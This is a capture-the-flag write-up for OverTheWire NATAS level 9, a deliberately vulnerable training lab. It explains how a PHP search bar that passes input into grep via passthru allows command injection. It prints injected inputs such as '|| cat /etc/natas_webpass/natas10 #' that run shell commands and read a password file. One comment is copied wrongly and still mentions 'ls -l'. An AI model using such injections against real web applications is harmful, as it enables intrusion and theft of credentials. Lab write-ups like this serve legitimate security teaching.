# NATAS Level 9 -> 10


## GOAL
To escape from an insecure search bar to retrieve the password.


## CONTEXT
Command injection is a type of web vulnerability where user input is improperly passed into system commands executed by the server. If an application builds shell commands using unsanitized input, an attacker may be able to append additional commands using shell operators such as `;`, `&&`, or `|`. 

This can allow arbitrary command execution on the underlying operating system, potentially exposing sensitive files, system information, or even granting remote control over the server. 


## STEPS
http://natas9.natas.labs.overthewire.org/

After entering the username and password, we find a search bar. When we open the source code, we see the following:

```
Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>
```

From this source code we can gather that whatever we search will be inserted into a `grep` command which will be executed through a `passthru()` PHP function. Therefore, this code shows all words from 'dictionary.txt' which contain our input.

Note that we will not find anything useful by simply reading the file:

http://natas9.natas.labs.overthewire.org/dictionary.txt

Also notice how whatever we request is inserted directly into the commandline, without any sanitization. This is a sign that we might be able to inject a command directly. To test this, we should escape the grep command and run `ls -l` on the dictionary file instead. We can do so by adding an OR operator (`||`) so that when `grep` fails (because it is incomplete), the next command runs:

``` bash
|| ls -l
# passthru will run "grep -i || ls -l dictionary.txt"
```

This should return something like this:

```
Output:

-rw-r----- 1 natas9 natas9 460878 Apr  3 15:07 dictionary.txt
```

...which means it worked!

We should be able to navigate through the server now:

``` bash
|| ls -l #
# we add '#' to comment dictionary.txt so 'ls -l' runs in the current directory instead of the file
```

Now retrieving the password should be easy, assuming we have read access to `/etc/natas_webpass/natas10`, which we do!:

``` bash
|| cat /etc/natas_webpass/natas10 #
# we add '#' to comment dictionary.txt so 'ls -l' runs in the current directory instead of the file
```

The password should appear on screen.

## SUMMARY
We have injected a command to a poorly implemented search bar to gain access to the server and retrieve the next password.
